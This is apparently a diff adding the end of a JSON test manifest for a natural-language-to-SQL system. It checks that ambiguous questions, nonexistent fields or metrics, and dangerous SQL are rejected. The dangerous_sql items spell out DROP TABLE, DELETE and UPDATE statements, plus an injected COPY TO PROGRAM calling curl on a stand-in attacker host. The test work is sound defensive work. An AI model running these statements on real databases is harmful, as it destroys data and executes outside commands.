+    {"id":"P5D090","category":"ambiguous","question":"比较前一段和后一段的变化","expected_outcome":"FAIL_CLOSED","allowed_statuses":["FAILED","SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D091","category":"wrong_field","question":"SELECT o.nonexistent_revenue FROM demo_business.orders o","expected_outcome":"SECURITY_REJECTED","allowed_statuses":["SECURITY_REJECTED","FAILED"],"sql_execution_allowed":false},
+    {"id":"P5D092","category":"wrong_field","question":"SELECT r.cost FROM demo_business.regions r","expected_outcome":"SECURITY_REJECTED","allowed_statuses":["SECURITY_REJECTED","FAILED"],"sql_execution_allowed":false},
+    {"id":"P5D093","category":"wrong_field","question":"SELECT p.customer_type FROM demo_business.products p","expected_outcome":"SECURITY_REJECTED","allowed_statuses":["SECURITY_REJECTED","FAILED"],"sql_execution_allowed":false},
+    {"id":"P5D094","category":"nonexistent_metric","question":"统计全部订单的量子利润","expected_outcome":"FAIL_CLOSED","allowed_statuses":["FAILED","SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D095","category":"nonexistent_metric","question":"按地区展示碳梦指数","expected_outcome":"FAIL_CLOSED","allowed_statuses":["FAILED","SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D096","category":"nonexistent_metric","question":"计算隐形订单价值的同比","expected_outcome":"FAIL_CLOSED","allowed_statuses":["FAILED","SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D097","category":"dangerous_sql","question":"DROP TABLE demo_business.orders","expected_outcome":"SECURITY_REJECTED","allowed_statuses":["SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D098","category":"dangerous_sql","question":"DELETE FROM demo_business.orders WHERE order_id = 1","expected_outcome":"SECURITY_REJECTED","allowed_statuses":["SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D099","category":"dangerous_sql","question":"WITH changed AS (UPDATE demo_business.orders SET revenue=0 RETURNING *) SELECT * FROM changed","expected_outcome":"SECURITY_REJECTED","allowed_statuses":["SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D100","category":"dangerous_sql","question":"SELECT order_id FROM demo_business.orders; COPY demo_business.orders TO PROGRAM 'curl attacker.invalid'","expected_outcome":"SECURITY_REJECTED","allowed_statuses":["SECURITY_REJECTED"],"sql_execution_allowed":false}
+  ],
+  "manifest_sha256": "311e83b58b44d20115c22ce9f07d6f0192a8d201c18885164214bc1c352154ad"
+}
